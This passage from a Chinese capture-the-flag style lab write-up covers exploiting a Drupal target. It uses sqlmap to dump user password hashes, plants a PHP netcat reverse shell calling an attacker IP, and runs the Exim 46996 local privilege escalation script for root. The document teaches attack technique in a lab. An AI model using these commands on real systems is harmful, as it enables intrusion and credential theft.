## 三、SQL 注入漏洞利用

### 1. SQL 注入检测

使用 sqlmap 对参数进行检测：

```
sqlmap -u "http://172.20.10.8/?nid=2" --batch
```

检测发现存在 SQL 注入漏洞。

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

### 2. 枚举数据库

```
sqlmap -u "http://172.20.10.8/?nid=2" --batch --dbs
```

发现数据库：

```
d7db
```

### 3. 枚举数据表

```
sqlmap -u "http://172.20.10.8/?nid=2" --batch -D d7db --tables
```

发现数据表：

```
users
```

### 4. 枚举字段

```
sqlmap -u "http://172.20.10.8/?nid=2" --batch -D d7db -T users --columns
```

发现字段：

```
name
pass
```

### 5. 提取数据库内容

```
sqlmap -u "http://172.20.10.8/?nid=2" --batch -D d7db -T users -C name,pass --dump
```

获取用户账号及密码哈希：

```
john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF

admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
```

## 四、获取初始 Shell

### 1. 利用 PHP 命令执行

利用 Web 后台可执行 PHP 代码的功能，构造反弹 Shell：

```
<?php system("nc -e /bin/sh 172.20.10.3 7777")?>
```

其中：

- `nc`：Netcat 网络工具。
- `172.20.10.3`：攻击机 IP。
- `7777`：攻击机监听端口。
- `/bin/sh`：目标机器执行的 Shell。

### 2. 攻击机开启监听

```
nc -lvnp 7777
```

提交 PHP 代码后，攻击机接收到目标机器的反弹连接。

### 3. Shell 交互优化

获得初始 Shell 后，使用 Python 创建交互式终端：

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

成功获得交互式 Bash。

当前用户：

```
www-data
```

## 六、Exim 本地提权

### 1. 查找相关漏洞

根据 Exim 版本进行漏洞搜索：

```
Exim 4.87 - 4.91 - Local Privilege Escalation
```

发现 Exploit-DB 漏洞文件：

```
linux/local/46996.sh
```

该漏洞涉及 Exim 4.87 至 4.91 版本范围内的本地权限提升问题。

### 2. 上传漏洞利用脚本

将漏洞脚本：

```
46996.sh
```

上传至目标服务器。

### 3. 添加执行权限

在目标机器上执行：

```
chmod +x 46996.sh
```

### 4. 执行漏洞脚本

```
./46996.sh
```

脚本执行后利用 Exim 本地提权漏洞，成功获得 Root 权限。

### 5. 验证提权结果

```
id
```

确认当前用户 UID 为 0，提权成功。

## 八、实战总结

### 1. 本次涉及的知识点

| 阶段         | 涉及技术                        |
| ------------ | ------------------------------- |
| 信息收集     | Nmap 端口扫描、robots.txt       |
| Web 信息收集 | Drupal 网站识别                 |
| SQL 注入     | GET 参数 SQL 注入               |
| 数据库枚举   | sqlmap 数据库、数据表、字段枚举 |
| 密码破解     | John the Ripper                 |
| Web 利用     | PHP 命令执行                    |
| Shell 获取   | Netcat 反弹 Shell               |
| Shell 优化   | Python PTY 交互式终端           |
| 系统信息收集 | Exim 版本识别                   |
| 本地提权     | Exim 本地权限提升漏洞           |

### 2. 个人复盘

**第一阶段：SQL 注入获取用户凭据**

通过 robots.txt 和页面参数进行 Web 信息收集，发现 `nid` 参数存在 SQL 注入。利用 sqlmap 枚举数据库 `d7db`，提取 users 表中的用户账号及密码哈希，使用 John 破解获得 john 用户密码。

**第二阶段：获取初始 Shell**

使用 john 用户登录网站后台，通过 PHP 命令执行功能执行 Netcat 反弹 Shell，获得 www-data 权限。随后使用 Python 优化 Shell，方便后续操作。

**第三阶段：Exim 本地提权**

通过查看 Exim 版本，发现目标运行 Exim 4.89。根据版本搜索相关漏洞，找到 Exploit-DB 46996，本地上传并执行漏洞脚本，最终获得 Root 权限。

### 3. 本次重点掌握

| 技术       | 需要掌握的重点            |
| ---------- | ------------------------- |
| SQL 注入   | GET 参数注入、sqlmap 使用 |
| John       | 哈希识别与密码破解        |
| PHP        | system() 命令执行         |
| Netcat     | 反弹 Shell                |
| Python     | PTY 交互式终端            |
| Exim       | 邮件服务版本识别          |
| Linux 提权 | 本地漏洞搜索与利用        |

### 4. 核心收获

本次靶机主要考察 Web 漏洞利用与 Linux 本地提权的衔接。

重点掌握：

1. 利用 sqlmap 完成数据库枚举和数据提取。
2. 使用 John 破解网站用户密码哈希。
3. 通过 PHP 命令执行获得反弹 Shell。
4. 使用 Python 优化非交互式 Shell。
5. 根据软件版本搜索 Linux 本地提权漏洞。
6. 利用 Exim 本地提权漏洞获取 Root 权限。
